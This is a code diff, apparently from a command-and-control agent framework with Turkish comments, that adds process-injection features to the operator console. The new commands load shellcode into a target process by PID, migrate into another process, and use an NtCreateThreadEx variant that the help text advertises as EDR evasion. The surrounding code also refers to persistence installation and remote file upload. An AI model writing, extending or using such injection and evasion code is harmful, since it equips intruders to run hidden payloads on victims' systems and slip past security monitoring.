@@ -305,6 +305,12 @@ class Handler(BaseHandler):
   persistence_install   - Ajanı sistem başlangıcına ekle (Kalıcılık)
   persistence_remove    - Kalıcılık ayarlarını temizle
 
+[Process Injection / Migration]
+  inject_list                         - Enjeksiyona uygun process'leri listele
+  inject_shellcode <PID> <file>       - Shellcode dosyasını hedef PID'e enjekte et
+  inject_shellcode_nt <PID> <file>    - NtCreateThreadEx ile enjeksiyon (EDR atlatma)
+  inject_migrate <PID> [file]         - Hedef process'e migrate et (opsiyonel shellcode)
+
 ═══════════════════════════════════════════════════════════════════
 """
                     print(help_text)
@@ -338,6 +344,68 @@ class Handler(BaseHandler):
                         
                     except Exception as e:
                         print(f"[!] Modül hazırlama hatası: {str(e)}")
+                        continue
+
+                # Process Injection: Shellcode dosyasını oku ve enjekte et
+                # Kullanım: inject_shellcode <PID> <local_shellcode_file>
+                if cmd_lower.startswith("inject_shellcode ") or cmd_lower.startswith("inject_shellcode_nt "):
+                    try:
+                        use_nt = cmd_lower.startswith("inject_shellcode_nt ")
+                        prefix = "inject_shellcode_nt " if use_nt else "inject_shellcode "
+                        rest   = cmd[len(prefix):].strip().split(None, 1)
+
+                        if len(rest) < 2:
+                            print(f"[!] Kullanım: {prefix.strip()} <PID> <local_shellcode_file>")
+                            continue
+
+                        target_pid    = rest[0]
+                        sc_file_path  = rest[1].strip()
+
+                        if not os.path.exists(sc_file_path):
+                            print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
+                            continue
+
+                        with open(sc_file_path, "rb") as _f:
+                            sc_bytes = _f.read()
+
+                        b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
+                        print(f"[*] Shellcode yükleniyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
+
+                        nt_prefix = "nt:" if use_nt else ""
+                        cmd = f"inject_shellcode_b64 {target_pid} {nt_prefix}{b64_sc}"
+
+                    except Exception as e:
+                        print(f"[!] Inject hazırlık hatası: {str(e)}")
+                        continue
+
+                # inject_migrate <PID> [local_shellcode_file]
+                if cmd_lower.startswith("inject_migrate "):
+                    try:
+                        rest = cmd[len("inject_migrate "):].strip().split(None, 1)
+
+                        if not rest:
+                            print("[!] Kullanım: inject_migrate <PID> [local_shellcode_file]")
+                            continue
+
+                        target_pid = rest[0]
+
+                        if len(rest) == 2:
+                            sc_file_path = rest[1].strip()
+                            if not os.path.exists(sc_file_path):
+                                print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
+                                continue
+
+                            with open(sc_file_path, "rb") as _f:
+                                sc_bytes = _f.read()
+
+                            b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
+                            print(f"[*] Migration shellcode hazırlanıyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
+                            cmd = f"inject_migrate {target_pid} {b64_sc}"
+                        else:
+                            cmd = f"inject_migrate {target_pid}"
+
+                    except Exception as e:
+                        print(f"[!] inject_migrate hazırlık hatası: {str(e)}")
                         continue
 
                 # Dosya Yükleme: Yerel dosyayı uzak sisteme transfer et
